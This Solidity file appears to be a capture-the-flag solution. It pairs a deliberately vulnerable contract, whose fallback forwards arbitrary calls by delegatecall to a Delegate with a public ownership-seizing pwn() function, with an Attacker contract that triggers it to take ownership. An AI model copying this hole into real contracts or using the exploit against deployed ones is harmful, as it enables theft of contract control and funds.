// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Delegate {

    address public owner;

    constructor(address _owner)  {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {

    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress)  {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
        this;
        }
    }
}

contract Attacker {
    Delegation attack;

    constructor(address _level){
        attack = Delegation(_level);

    }

    function test() public{
        address(attack).call(abi.encodeWithSignature("pwn()"));
        
    }

}